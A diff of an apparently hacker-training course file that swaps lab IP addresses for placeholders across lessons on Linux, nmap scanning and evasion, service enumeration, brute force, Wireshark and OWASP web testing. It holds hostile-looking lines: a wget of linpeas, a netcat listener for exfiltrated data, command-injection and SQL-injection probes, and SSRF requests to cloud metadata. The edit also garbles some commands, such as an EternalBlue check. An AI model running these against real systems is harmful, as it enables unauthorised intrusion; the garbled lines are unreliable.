@@ -359,7 +359,7 @@ uname -a
 # Check the system hostname
 hostname
 
-# See who else is currently training on this lab
+# See who else is currently logged in
 users
 \`\`\`
 
@@ -388,7 +388,7 @@ Linux is organized like a giant tree. As an HSociety Hacker, you should know exa
 # See the root of the entire system
 ls -F /
 
-# Check your current path (Where am I in the HSociety lab?)
+# Check your current path (Where am I in the target environment?)
 pwd
 
 # List files with human-readable sizes (K, M, G)
@@ -405,7 +405,7 @@ echo $PATH
 echo $SHELL
 
 # Set a temporary variable for your current target
-export TARGET="10.10.10.10"
+export TARGET="<target_ip>"
 echo "Current Target: $TARGET"
 \`\`\`
 
@@ -908,7 +908,7 @@ sudo tail -n 50 /var/log/auth.log | grep sudo
           id: 'room3',
           title: 'Processes & Networking',
           overview:
-            "A system is a living organism, constantly exchanging data and running background tasks. To train like a hacker is to understand the heartbeat of the machine. In this room, you will learn to monitor every process and every open door in the HSociety lab, identifying targets and evading detection.",
+            "A system is a living organism, constantly exchanging data and running background tasks. To train like a hacker is to understand the heartbeat of the machine. In this room, you will learn to monitor every process and every open door in the target environment, identifying targets and evading detection.",
           estimatedMinutes: 35,
           steps: [
             {
@@ -952,7 +952,7 @@ sudo lsof -p 1234
 
 **4. Performance & Resource Auditing:**
 \`\`\`bash
-# See how much memory is free in the HSociety lab
+# See how much memory is free on the target system
 free -ht
 
 # Check disk usage (Find where the large logs are hidden)
@@ -1050,8 +1050,8 @@ netstat -pant
 
 **1. The Web-Based Extractors:**
 \`\`\`bash
-# Download a tool from the HSociety lab server
-wget http://10.10.10.5/tools/linpeas.sh -O /tmp/linpeas.sh
+# Download a tool from a remote server
+wget http://<remote_server_ip>/tools/linpeas.sh -O /tmp/linpeas.sh
 
 # Fetch the headers of a target site to identify the server
 curl -I http://<target_ip>
@@ -1073,7 +1073,7 @@ rsync -avz ./recon_data/ hacker@<target_ip>:~/backup/
 Netcat is the "Swiss Army Knife" of every HSociety Hacker.
 \`\`\`bash
 # Connect to a web server and manually send a GET request
-echo -e "GET / HTTP/1.0\r\n\r\n" | nc -nv 10.10.10.10 80
+echo -e "GET / HTTP/1.0\r\n\r\n" | nc -nv <target_ip> 80
 
 # Create a simple listener to receive a file
 nc -lvnp 4444 > exfiltrated_data.zip
@@ -1082,10 +1082,10 @@ nc -lvnp 4444 > exfiltrated_data.zip
 **4. Advanced Connectivity Testing:**
 \`\`\`bash
 # Trace the path to a target using TCP (Bypasses many firewalls)
-sudo traceroute -T -p 80 10.10.10.10
+sudo traceroute -T -p 80 <target_ip>
 
 # Ping a target with a specific packet size (Check for MTU issues)
-ping -s 1000 -c 4 10.10.10.10
+ping -s 1000 -c 4 <target_ip>
 \`\`\`
 
 **5. SSH Port Forwarding (The Pro Move):**
@@ -1101,10 +1101,10 @@ ssh -D 1080 hacker@<target_ip>
 **6. Network Benchmarking & Stress:**
 \`\`\`bash
 # See how fast you can transfer data to the target
-iperf3 -c 10.10.10.10
+iperf3 -c <target_ip>
 \`\`\`
 
-*Experiment:* Use \`curl\` to visit \`http://10.10.10.5\`. If it fails, try adding \`-k\` to ignore SSL errors or \`-L\` to follow redirects. Every failure is a lesson in the HSociety program.`,
+*Experiment:* Use \`curl\` to visit \`http://<remote_server_ip>\`. If it fails, try adding \`-k\` to ignore SSL errors or \`-L\` to follow redirects. Every failure is a lesson in the HSociety program.`,
               image: 'step-03.webp',
             },
             {
@@ -1218,7 +1218,7 @@ Intermediate scripts handle data by redirecting output and errors.
 ./my_tool.sh > output.log 2>/dev/null
 
 # Append output to an existing file
-echo "New Target: 10.10.10.10" >> targets.txt
+echo "New Target: <target_ip>" >> targets.txt
 
 # Pipe one script's output into another
 ./get_ips.sh | ./scan_ips.sh
@@ -1267,7 +1267,7 @@ log_action() {
 }
 
 # Call the function
-log_action "Scanning target: 10.10.10.10"
+log_action "Scanning target: <target_ip>"
 \`\`\`
 
 *Self-Check:* Create a script that prints "Training to be an HSociety Hacker" and saves it to a file named \`goal.txt\`. Use the commands you've learned to make it executable and run it.`,
@@ -1276,12 +1276,12 @@ log_action "Scanning target: 10.10.10.10"
             {
               title: 'Variables & Intelligent Tooling',
               instruction:
-                `To become a hacker, your tools must be smart. By using variables and user input, you can create scripts that adapt to any environment. In the HSociety lab, we don't hardcode targets; we build flexible instruments of discovery.
+                `To become a hacker, your tools must be smart. By using variables and user input, you can create scripts that adapt to any environment. In the field, we don't hardcode targets; we build flexible instruments of discovery.
 
 **1. Variable Manipulation:**
 \`\`\`bash
 # Store the target IP
-TARGET_IP="10.10.10.10"
+TARGET_IP="<target_ip>"
 
 # Use the variable in a command
 ping -c 1 $TARGET_IP
@@ -1308,7 +1308,7 @@ fi
 **3. Environment & Default Values:**
 \`\`\`bash
 # Use a default value if the variable is empty
-TARGET="$\{1:-10.10.10.10}"
+TARGET="$\{1:-<target_ip>}"
 echo "Scanning $TARGET"
 
 # Access environment variables from within your script
@@ -1355,14 +1355,14 @@ echo "New Path: $\{STAGED_PATH/tmp/dev/shm}"
 **1. The 'For' Loop Mastery:**
 \`\`\`bash
 # Loop through a known list of HSociety servers
-for HOST in 10.10.10.80 10.10.10.33 <api_internal>; do
+for HOST in <target_ip_1> <target_ip_2> <api_internal>; do
     echo "Pinging $HOST..."
     nc -zv $HOST 80 2>&1 | grep "open"
 done
 
 # Loop through a numeric range (1 to 254)
 for i in {1..254}; do
-    echo "10.10.10.$i" >> subnet_map.txt
+    echo "<target_prefix>.$i" >> subnet_map.txt
 done
 \`\`\`
 
@@ -1387,7 +1387,7 @@ done
 **4. Nested Loops (Grid Scanning):**
 \`\`\`bash
 # Scan a grid of IPs and Ports
-for IP in 10.10.10.{1..5}; do
+for IP in <target_prefix>.{1..5}; do
     for PORT in 22 80 443; do
         echo "Testing $IP:$PORT"
     done
@@ -1534,14 +1534,14 @@ hs-recon-tool/
 
 **Example CLI Output in README:**
 \`\`\`text
-$ ./hs-recon.sh 10.10.10.10
-[*] Checking 10.10.10.10...
+$ ./hs-recon.sh <target_ip>
+[*] Checking <target_ip>...
 [+] Target is ALIVE.
 [*] Scanning common ports...
 [!] Port 22 is OPEN.
 [!] Port 80 is OPEN.
 [-] Port 443 is CLOSED.
-[*] Results saved to 10.10.10.10_report.txt
+[*] Results saved to <target_ip>_report.txt
 \`\`\`
 
 ### Walkthrough & Stages:
@@ -1638,25 +1638,25 @@ ip link show eth0 | grep mtu
 **Scanning with Precision:**
 \`\`\`bash
 # SYN Stealth Scan (-sS): Half-open scan. Fast and less detectable.
-sudo nmap -sS -T4 10.10.10.10
+sudo nmap -sS -T4 <target_ip>
 
 # Connect Scan (-sT): Completes the full handshake. Use when you lack root.
-nmap -sT 10.10.10.10
+nmap -sT <target_ip>
 
 # ACK Scan (-sA): Map out firewall rules (Check if ports are filtered)
-sudo nmap -sA 10.10.10.10
+sudo nmap -sA <target_ip>
 \`\`\`
 
 **Advanced Packet Manipulation:**
 \`\`\`bash
 # Xmas Scan (-sX): Sets FIN, PSH, and URG flags (Lights up like a Christmas tree)
-sudo nmap -sX 10.10.10.10
+sudo nmap -sX <target_ip>
 
 # Null Scan (-sN): Sends a packet with NO flags set. Confuses older systems.
-sudo nmap -sN 10.10.10.10
+sudo nmap -sN <target_ip>
 
 # Idle Scan (-sI): Uses a 'Zombie' host to hide your IP completely.
-# sudo nmap -sI 10.10.10.20 10.10.10.10
+# sudo nmap -sI <zombie_ip> <target_ip>
 \`\`\`
 
 **Watching the Handshake:**
@@ -1684,25 +1684,25 @@ sudo tcpdump -ni any -vvv port 80
 UDP doesn't use a handshake, making it harder to scan accurately.
 \`\`\`bash
 # Standard UDP scan (Slow, as it waits for timeouts)
-sudo nmap -sU 10.10.10.10
+sudo nmap -sU <target_ip>
 
 # Scan the top 100 most common UDP ports
-sudo nmap -sU --top-ports 100 10.10.10.10
+sudo nmap -sU --top-ports 100 <target_ip>
 
 # Use version detection on UDP ports (-sV)
-sudo nmap -sU -sV -p 53,161 10.10.10.10
+sudo nmap -sU -sV -p 53,161 <target_ip>
 \`\`\`
 
 **Advanced UDP Recon:**
 \`\`\`bash
 # Query SNMP community strings (The 'keys' to network devices)
-onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt 10.10.10.10
+onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt <target_ip>
 
 # Enumerate detailed system info via SNMP
-snmp-check 10.10.10.10
+snmp-check <target_ip>
 
 # Test if a UDP port is responsive with netcat
-nc -zvu 10.10.10.10 53
+nc -zvu <target_ip> 53
 \`\`\`
 
 **Protocol Analysis:**
@@ -1728,7 +1728,7 @@ sudo tcpdump -i any udp port 53
 sudo tcpdump -i eth0
 
 # Capture only traffic coming FROM a specific target
-sudo tcpdump src 10.10.10.10
+sudo tcpdump src <target_ip>
 
 # Capture traffic on a specific port (HTTP)
 sudo tcpdump port 80
@@ -1802,7 +1802,7 @@ dig <target_domain> TXT
 dig @<nameserver_ip> <target_domain>
 
 # Reverse DNS lookup (Map an IP back to a name)
-dig -x 10.10.10.10
+dig -x <target_ip>
 
 # List ALL common record types at once
 dig <target_domain> ANY
@@ -1815,7 +1815,7 @@ A successful Zone Transfer gives you a complete list of EVERY subdomain.
 dig axfr @<nameserver_ip> <target_domain>
 
 # Use 'host' as an alternative way to attempt AXFR
-host -l 10.10.10.10 <nameserver_ip>
+host -l <target_ip> <nameserver_ip>
 \`\`\`
 
 **Automation & Brute Force:**
@@ -1914,23 +1914,23 @@ ssh hacker@<target_ip>
 ssh hacker@<target_ip> "ls -la /var/www"
 
 # Check the SSH server's version (Banner Grabbing)
-nc -vn 10.10.10.10 22
+nc -vn <target_ip> 22
 \`\`\`
 
 **FTP (File Transfer Protocol):**
 \`\`\`bash
 # Attempt an 'Anonymous' login (Username: anonymous, Password: <any>)
-ftp 10.10.10.10
+ftp <target_ip>
 
 # List all files recursively on an FTP server
-nmap --script ftp-anon,ftp-libwrap,ftp-proftpd-backdoor -p 21 10.10.10.10
+nmap --script ftp-anon,ftp-libwrap,ftp-proftpd-backdoor -p 21 <target_ip>
 \`\`\`
 
 **SMTP (Simple Mail Transfer Protocol):**
 \`\`\`bash
 # Interact with a mail server to verify users (VRFY)
-nc -vn 10.10.10.10 25
-HELO 10.10.10.10
+nc -vn <target_ip> 25
+HELO <target_ip>
 VRFY admin
 VRFY root
 \`\`\`
@@ -1938,10 +1938,10 @@ VRFY root
 **Automated Enumeration:**
 \`\`\`bash
 # Use nmap scripts to audit these protocols
-sudo nmap -sV -sC -p 21,22,25 10.10.10.10
+sudo nmap -sV -sC -p 21,22,25 <target_ip>
 
 # Brute force SSH with a common password list (Use with caution)
-# hydra -l root -P passwords.txt ssh://10.10.10.10
+# hydra -l root -P passwords.txt ssh://<target_ip>
 \`\`\`
 
 **Network Service Discovery:**
@@ -1964,7 +1964,7 @@ sudo tcpdump -i any port 21 or port 22 or port 25
 **The Recon Pipeline:**
 \`\`\`bash
 # 1. Identify the target's IP from its domain
-TARGET_IP=$(dig +short 10.10.10.10)
+TARGET_IP=$(dig +short <target_ip>)
 
 # 2. Map the open ports (TCP)
 sudo nmap -sS -p- --min-rate 5000 $TARGET_IP -oN scan.txt
@@ -1977,7 +1977,7 @@ sudo nmap -sV -sC -p 22,80,443 $TARGET_IP
 **Advanced Banner Grabbing:**
 \`\`\`bash
 # Use a loop to grab banners from multiple ports
-for port in 21 22 25 80; do (echo > /dev/tcp/10.10.10.10/$port) >/dev/null 2>&1 && echo "$port is open"; done
+for port in 21 22 25 80; do (echo > /dev/tcp/<target_ip>/$port) >/dev/null 2>&1 && echo "$port is open"; done
 
 # Use 'whatweb' to identify the technologies behind a website
 whatweb http://<target_ip>
@@ -1992,12 +1992,12 @@ tshark -r capture.pcap -Y http -T fields -e http.host | sort -u
 tshark -r capture.pcap -Y "ftp.request.command == USER" -T fields -e ftp.request.arg
 \`\`\`
 
-**HSociety Lab Drill:**
+**Practical Drill:**
 \`\`\`bash
 # Use 'telnet' to manually talk to an HTTP server (Rarely used, but great for learning)
-telnet 10.10.10.10 80
+telnet <target_ip> 80
 GET / HTTP/1.0
-Host: 10.10.10.10
+Host: <target_ip>
 (Press Enter twice)
 \`\`\`
 
@@ -2027,71 +2027,71 @@ grep -oE "\b([0-9]{1,3}\\.){3}[0-9]{1,3}\b" scan.txt | sort -u
 **Core Scan Archetypes:**
 \`\`\`bash
 # The Default 'Stealth' Scan (SYN Scan)
-sudo nmap -sS -T4 10.10.10.10
+sudo nmap -sS -T4 <target_ip>
 
 # Connect Scan (TCP Handshake) - No root required
-nmap -sT -T4 10.10.10.10
+nmap -sT -T4 <target_ip>
 
 # UDP Scan (Essential for finding hidden services)
-sudo nmap -sU 10.10.10.10
+sudo nmap -sU <target_ip>
 \`\`\`
 
 **Timing & Performance Optimization:**
 \`\`\`bash
 # 'Paranoid' scan to evade older IDS/IPS (-T0)
-sudo nmap -sS -T0 10.10.10.10
+sudo nmap -sS -T0 <target_ip>
 
 # 'Aggressive' scan for fast results on stable networks (-T4)
-sudo nmap -sS -T4 10.10.10.10
+sudo nmap -sS -T4 <target_ip>
 
 # Scan all 65,535 ports with high speed
-sudo nmap -p- --min-rate 10000 10.10.10.10
+sudo nmap -p- --min-rate 10000 <target_ip>
 \`\`\`
 
 **Evading Firewalls & IDS:**
 \`\`\`bash
 # Fragment packets to bypass simple packet filters
-sudo nmap -f 10.10.10.10
+sudo nmap -f <target_ip>
 
 # Use a specific source port (e.g., 53 or 80) to bypass rules
-sudo nmap --source-port 53 10.10.10.10
+sudo nmap --source-port 53 <target_ip>
 
 # Add random data (Padding) to packets to change their signature
-sudo nmap --data-length 25 10.10.10.10
+sudo nmap --data-length 25 <target_ip>
 \`\`\`
 
 **OS & Service Fingerprinting:**
 \`\`\`bash
 # Attempt to identify the Operating System
-sudo nmap -O 10.10.10.10
+sudo nmap -O <target_ip>
 
 # Intense service version detection
-sudo nmap -sV --version-intensity 9 10.10.10.10
+sudo nmap -sV --version-intensity 9 <target_ip>
 
 # The 'Aggressive' all-in-one flag (-A)
 # (Equivalent to -sV -O -sC --traceroute)
-sudo nmap -A 10.10.10.10
+sudo nmap -A <target_ip>
 \`\`\`
 
 **Packet-Level Observation:**
 \`\`\`bash
 # See exactly what Nmap is sending and receiving in real-time
-sudo nmap -sS -p 80 --packet-trace 10.10.10.10
+sudo nmap -sS -p 80 --packet-trace <target_ip>
 
 # Show why Nmap thinks a port is in a certain state
-sudo nmap -sS -p 80 --reason 10.10.10.10
+sudo nmap -sS -p 80 --reason <target_ip>
 \`\`\`
 
 **Output Management for Reporting:**
 \`\`\`bash
 # Save output in 'Greppable' format for easy parsing
-nmap -sS 10.10.10.10 -oG scan_results.txt
+nmap -sS <target_ip> -oG scan_results.txt
 
 # Save in XML for importing into tools like Metasploit
-nmap -sS 10.10.10.10 -oX scan_results.xml
+nmap -sS <target_ip> -oX scan_results.xml
 
 # Use 'Aleeet' format for a classic hacker look (-oN)
-nmap -sS 10.10.10.10 -oS -
+nmap -sS <target_ip> -oS -
 \`\`\`
 
 *Operative Drill:* Perform an \`-sS\` scan and an \`-sT\` scan while running \`tcpdump\`. Which one completes the handshake? Which one sends a \`RST\`?`,
@@ -2105,19 +2105,19 @@ nmap -sS 10.10.10.10 -oS -
 **Advanced Version Discovery:**
 \`\`\`bash
 # Version detection with specific port targeting
-sudo nmap -sV -p 22,80,443,445 10.10.10.10
+sudo nmap -sV -p 22,80,443,445 <target_ip>
 
 # Guess the OS if detection isn't 100% sure
-sudo nmap -O --osscan-guess 10.10.10.10
+sudo nmap -O --osscan-guess <target_ip>
 \`\`\`
 
 **Identifying Web Technologies:**
 \`\`\`bash
 # Grab the HTTP title and server headers
-nmap -p 80 --script http-title,http-headers 10.10.10.10
+nmap -p 80 --script http-title,http-headers <target_ip>
 
 # Enumerate common directories and files
-nmap -p 80 --script http-enum 10.10.10.10
+nmap -p 80 --script http-enum <target_ip>
 \`\`\`
 
 **Vulnerability Research Workflow:**
@@ -2133,30 +2133,30 @@ searchsploit "Apache 2.4.41" | grep -i "remote"
 **Interrogating SMB (Windows Sharing):**
 \`\`\`bash
 # Identify the OS and computer name via SMB
-nmap -p 445 --script smb-os-discovery 10.10.10.10
+nmap -p 445 --script smb-os-discovery <target_ip>
 
 # List shared folders (Requires guest or valid credentials)
-nmap -p 445 --script smb-enum-shares 10.10.10.10
+nmap -p 445 --script smb-enum-shares <target_ip>
 \`\`\`
 
 **Interrogating Databases:**
 \`\`\`bash
 # Check if MySQL allows anonymous login
-nmap -p 3306 --script mysql-empty-password 10.10.10.10
+nmap -p 3306 --script mysql-empty-password <target_ip>
 
 # Get the MySQL version and configuration info
-nmap -p 3306 --script mysql-info 10.10.10.10
+nmap -p 3306 --script mysql-info <target_ip>
 \`\`\`
 
 **Banners & Raw Interaction:**
 \`\`\`bash
 # Manually grab a banner using netcat
-nc -vn 10.10.10.10 80
+nc -vn <target_ip> 80
 HEAD / HTTP/1.0
 (Enter)
 
 # Use 'telnet' for services that expect raw text
-telnet 10.10.10.10 25
+telnet <target_ip> 25
 \`\`\`
 
 *Hacker's Strategy:* If Nmap reports a port as 'Filtered,' it means a firewall is dropping the packets. Try changing your source port to 53 or 88 — firewalls often trust traffic from DNS or Kerberos ports.`,
@@ -2170,34 +2170,34 @@ telnet 10.10.10.10 25
 **Using Script Categories:**
 \`\`\`bash
 # Run all 'Default' and 'Safe' scripts
-nmap -sC 10.10.10.10
+nmap -sC <target_ip>
 
 # Scan for common vulnerabilities (Very noisy!)
-nmap --script vuln 10.10.10.10
+nmap --script vuln <target_ip>
 
 # Discover network information without being intrusive
-nmap --script discovery 10.10.10.10
+nmap --script discovery <target_ip>
 \`\`\`
 
 **Targeted Vulnerability Checks:**
 \`\`\`bash
 # Check for the famous 'EternalBlue' (SMB) vulnerability
-nmap -p 445 --script smb-vuln-ms17-010.10.10.10
+nmap -p 445 --script smb-vuln-ms17-0<target_ip>
 
 # Check for 'Heartbleed' (SSL/TLS)
-nmap -p 443 --script ssl-heartbleed 10.10.10.10
+nmap -p 443 --script ssl-heartbleed <target_ip>
 
 # Check for Shellshock (Web)
-nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi 10.10.10.10
+nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi <target_ip>
 \`\`\`
 
 **Brute Force via NSE:**
 \`\`\`bash
 # Brute force FTP credentials
-nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt 10.10.10.10
+nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt <target_ip>
 
 # Brute force HTTP Basic Auth
-nmap -p 80 --script http-brute 10.10.10.10
+nmap -p 80 --script http-brute <target_ip>
 \`\`\`
 
 **Advanced Script Management:**
@@ -2215,16 +2215,16 @@ sudo nmap --script-updatedb
 **Analyzing Script Output:**
 \`\`\`bash
 # Run a script with increased verbosity to see the details
-nmap -p 443 --script ssl-cert -vv 10.10.10.10
+nmap -p 443 --script ssl-cert -vv <target_ip>
 
 # Debug a script if it's not working as expected
-nmap -p 80 --script http-enum --script-trace 10.10.10.10
+nmap -p 80 --script http-enum --script-trace <target_ip>
 \`\`\`
 
 **Combining Multiple Scripts:**
 \`\`\`bash
 # Run multiple related scripts at once
-nmap -p 80 --script http-title,http-headers,http-methods,http-enum 10.10.10.10
+nmap -p 80 --script http-title,http-headers,http-methods,http-enum <target_ip>
 \`\`\`
 
 *Operative Drill:* Browse \`/usr/share/nmap/scripts/\`. Find a script you've never used, read its code, and explain to yourself how it detects a vulnerability. This is how you move from tool-user to tool-master.`,
@@ -2238,7 +2238,7 @@ nmap -p 80 --script http-title,http-headers,http-methods,http-enum 10.10.10.10
 **Step 1: Discover Live Hosts:**
 \`\`\`bash
 # Scan a subnet for live machines and save their IPs
-nmap -sn 10.10.10.0/24 -oG - | awk '/Up$/{print $2}' > targets.txt
+nmap -sn <target_subnet> -oG - | awk '/Up$/{print $2}' > targets.txt
 
 # Verify the count of targets discovered
 wc -l targets.txt
@@ -2266,7 +2266,7 @@ sudo nmap -sV -sC -p 22,80,445 -iL targets.txt -oA deep_recon
 for ip in $(cat targets.txt); do nc -zw1 $ip 80 && echo "$ip has HTTP open"; done
 
 # Use 'masscan' for incredibly fast scans across massive ranges
-# sudo masscan -p80,443 10.10.10.0/24 --rate 1000
+# sudo masscan -p80,443 <target_subnet> --rate 1000
 \`\`\`
 
 **Cleaning and Formatting Data:**
@@ -2388,7 +2388,7 @@ tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command ==
 **Logical Filter Combinations:**
 \`\`\`bash
 # Filter for HTTPS traffic excluding your own IP
-tshark -r capture.pcap -Y "tcp.port == 443 and ip.addr != 10.10.10.5"
+tshark -r capture.pcap -Y "tcp.port == 443 and ip.addr != <remote_server_ip>"
 
 # Show only DNS responses that took longer than 1 second
 tshark -r capture.pcap -Y "dns.time > 1.0"
@@ -2412,7 +2412,7 @@ tshark -r capture.pcap -Y "tcp.flags.reset == 1"
 tshark -r capture.pcap -Y "tcp.analysis.retransmission"
 \`\`\`
 
-*Training Task:* Create a Tshark filter that shows only traffic between your machine and \`10.10.10.10\`, excluding any SSH or HTTP traffic. What protocols are left?`,
+*Training Task:* Create a Tshark filter that shows only traffic between your machine and \`<target_ip>\`, excluding any SSH or HTTP traffic. What protocols are left?`,
               image: 'step-02.webp',
             },
             {
@@ -2454,7 +2454,7 @@ tshark -r capture.pcap -Y "smtp" -T fields -e smtp.mail_from -e smtp.rcpt_to
 \`\`\`
 
 **Handling Encrypted Traffic:**
-In the HSociety lab, you may be given an RSA private key to decrypt traffic.
+In the engagement, you may be given an RSA private key to decrypt traffic.
 \`\`\`bash
 # Decrypt SSL/TLS traffic using a private key file
 tshark -r capture.pcap -o "tls.keys_list:0.0.0.0,443,http,server.key" -Y http
@@ -2498,7 +2498,7 @@ tshark -r capture.pcap -T fields -e dns.qry.type | sort | uniq -c
 tshark -r capture.pcap -Y "dns.txt" -T fields -e dns.txt
 
 # Monitor for DNS queries to known malicious domains
-tshark -r capture.pcap -Y 'dns.qry.name contains "10.10.10.200"'
+tshark -r capture.pcap -Y 'dns.qry.name contains "<malicious_domain_ip>"'
 \`\`\`
 
 **Entropy & Anomaly Detection:**
@@ -2604,7 +2604,7 @@ Submit your GitHub repository link using the button below.`,
                 `Every web attack starts with visibility. Browser DevTools is your first line of reconnaissance, allowing you to see exactly what the browser is hiding from the average user.
 
 **1. Activating Surveillance:**
-Open the target app (\`10.10.10.100\`). Press \`F12\` or \`Ctrl+Shift+I\`. Navigate to the **Network** tab and reload with \`Ctrl+R\`.
+Open the target app (\`<target_ip>\`). Press \`F12\` or \`Ctrl+Shift+I\`. Navigate to the **Network** tab and reload with \`Ctrl+R\`.
 
 **2. Analyzing the Traffic Stream:**
 Each row in the Network tab is a 'packet' of information.
@@ -2615,7 +2615,7 @@ Each row in the Network tab is a 'packet' of information.
 **3. Inspecting Request Headers:**
 \`\`\`http
 GET /api/user/profile HTTP/1.1
-Host: 10.10.10.101
+Host: <target_ip>1
 User-Agent: Mozilla/5.0 (HSociety Operative)
 Cookie: session=hacker_session_123
 \`\`\`
@@ -2637,7 +2637,7 @@ Go to the **Console** tab and manually trigger a request to see how the server r
 fetch('/api/status').then(res => res.json()).then(console.log);
 \`\`\`
 
-*Training Task:* Identify the \`Server\` header for \`10.10.10.100\`. Does it reveal a specific version? Research if that version has any 'Zero-Day' or known exploits.`,
+*Training Task:* Identify the \`Server\` header for \`<target_ip>\`. Does it reveal a specific version? Research if that version has any 'Zero-Day' or known exploits.`,
               image: 'step-01.webp',
             },
             {
@@ -2786,7 +2786,7 @@ Output: <script>alert(1)</script> (URL Decoded)
 Send two different responses to Comparer to spot subtle differences in timing or content.
 
 **6. Analyzing the Attack Surface (The Target Tab):**
-Use the Site Map to build a visual tree of every folder and file discovered on \`10.10.10.10\`.
+Use the Site Map to build a visual tree of every folder and file discovered on \`<target_ip>\`.
 
 *Training Task:* Capture a request to \`/api/profile\`. In Burp Repeater, change the \`GET\` method to \`POST\`. Does the server respond differently? Sometimes 'Hidden' APIs are only accessible via specific methods.`,
               image: null,
@@ -2810,17 +2810,17 @@ Users accessing data they shouldn't.
 \`\`\`bash
 # Test for IDOR (Insecure Direct Object Reference)
 # Accessing user 1001's profile as user 1002
-curl -b "session=trainee_1002" http://<target_ip>0/api/users/1001
+curl -b "session=trainee_1002" http://<target_ip>/api/users/1001
 
 # Attempting to access the admin panel without admin privileges
-curl -I -b "session=trainee_1002" http://<target_ip>0/admin
+curl -I -b "session=trainee_1002" http://<target_ip>/admin
 \`\`\`
 
 **A02: Cryptographic Failures (The Weak Vault):**
 Sensitive data exposed due to poor encryption.
 \`\`\`bash
 # Check if the target is using outdated TLS versions
-nmap --script ssl-enum-ciphers -p 443 10.10.10.100
+nmap --script ssl-enum-ciphers -p 443 <target_ip>
 
 # Identify cleartext HTTP transmission of sensitive data
 sudo tcpdump -A -ni any 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)' | grep -i "pass"
@@ -2830,27 +2830,27 @@ sudo tcpdump -A -ni any 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x5
 Untrusted data changing the logic of a command.
 \`\`\`bash
 # Test for basic SQL Injection in a search field
-curl "http://<target_ip>0/search?q=hpb'-- "
+curl "http://<target_ip>/search?q=hpb'-- "
 
 # Test for Command Injection (Executing system commands)
-curl "http://<target_ip>0/ping?host=127.0.0.1;whoami"
+curl "http://<target_ip>/ping?host=127.0.0.1;whoami"
 \`\`\`
 
 **A04: Insecure Design (The Flawed Blueprint):**
 Security failed at the drawing board.
 \`\`\`bash
 # Identify lack of rate limiting on a login endpoint
-for i in {1..20}; do curl -s -I -X POST http://<target_ip>0/login | grep "HTTP/1.1"; done
+for i in {1..20}; do curl -s -I -X POST http://<target_ip>/login | grep "HTTP/1.1"; done
 \`\`\`
 
 **A05: Security Misconfiguration (The Open Window):**
 Defaults left unchanged or debug modes enabled.
 \`\`\`bash
 # Check for common default files and directories
-nmap -p 80 --script http-enum 10.10.10.100
+nmap -p 80 --script http-enum <target_ip>
 
 # Trigger a 404 to see if the server leaks technology info
-curl -s http://<target_ip>0/nonexistent_path_12345 | grep -i "server"
+curl -s http://<target_ip>/nonexistent_path_12345 | grep -i "server"
 \`\`\`
 
 *Operative Drill:* Which of these five categories do you think is hardest to detect with automated scanners? Why does an HSociety operative provide more value than a tool?`,
@@ -2864,7 +2864,7 @@ curl -s http://<target_ip>0/nonexistent_path_12345 | grep -i "server"
 **A06: Vulnerable and Outdated Components:**
 \`\`\`bash
 # Grab headers to identify server and language versions
-curl -I http://<target_ip>0
+curl -I http://<target_ip>
 
 # Search for known exploits for the identified versions
 searchsploit "Nginx 1.18.0"
@@ -2873,11 +2873,11 @@ searchsploit "Nginx 1.18.0"
 **A07: Identification and Authentication Failures:**
 \`\`\`bash
 # Test for username enumeration (Check response timing or messages)
-curl -d "user=admin&pass=1" http://<target_ip>0/login -v
-curl -d "user=fakeuser123&pass=1" http://<target_ip>0/login -v
+curl -d "user=admin&pass=1" http://<target_ip>/login -v
+curl -d "user=fakeuser123&pass=1" http://<target_ip>/login -v
 
 # Check if session tokens are rotated after login
-curl -I http://<target_ip>0/login
+curl -I http://<target_ip>/login
 \`\`\`
 
 **A08: Software and Data Integrity Failures:**
@@ -2890,23 +2890,23 @@ echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImlzQWRtIjtCOj
 \`\`\`bash
 # Check if your failed attempts are being blocked (Indicates monitoring)
 # (Repeatedly try to access a restricted resource)
-for i in {1..50}; do curl -s -o /dev/null -w "%{http_code}\n" http://<target_ip>0/admin; done
+for i in {1..50}; do curl -s -o /dev/null -w "%{http_code}\n" http://<target_ip>/admin; done
 \`\`\`
 
 **A10: Server-Side Request Forgery (SSRF):**
 The server fetching data on behalf of the attacker.
 \`\`\`bash
 # Trick the server into fetching internal metadata (Cloud targets)
-curl "http://<target_ip>0/view?url=http://169.254.169.254/latest/meta-data/"
+curl "http://<target_ip>/view?url=http://169.254.169.254/latest/meta-data/"
 
 # Scan internal ports via the vulnerable server
-curl "http://<target_ip>0/view?url=http://localhost:3306"
+curl "http://<target_ip>/view?url=http://localhost:3306"
 \`\`\`
 
 **Combining Techniques for Demonstrable Impact:**
 \`\`\`bash
 # Use A10 (SSRF) to exploit A05 (Misconfiguration) on an internal service
-curl "http://<target_ip>0/view?url=http://internal-db:8080/phpmyadmin"
+curl "http://<target_ip>/view?url=http://internal-db:8080/phpmyadmin"
 \`\`\`
 
 *HSociety Insight:* SSRF (A10) is one of the most prized findings in cloud environments. It often allows an operative to steal IAM roles and gain full control over the infrastructure.`,
@@ -2920,7 +2920,7 @@ curl "http://<target_ip>0/view?url=http://internal-db:8080/phpmyadmin"
 **Reconnaissance & Surface Mapping:**
 \`\`\`bash
 # 1. Map the directory structure and hidden files
-gobuster dir -u http://<target_ip>0 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
 
 # 2. Identify all input points (Forms, URL params, Headers)
 # (Use Burp Suite to build the Site Map)
@@ -2929,16 +2929,16 @@ gobuster dir -u http://<target_ip>0 -w /usr/share/wordlists/dirb/common.txt
 **Testing for Common Low-Hanging Fruit:**
 \`\`\`bash
 # 3. Check for Directory Listing (A05)
-curl -I http://<target_ip>0/uploads/
+curl -I http://<target_ip>/uploads/
 
 # 4. Check for 'Verbose' Error Messages (A05)
-curl -X DELETE http://<target_ip>0/api/user/1
+curl -X DELETE http://<target_ip>/api/user/1
 \`\`\`
 
 **Deep Manual Inspection:**
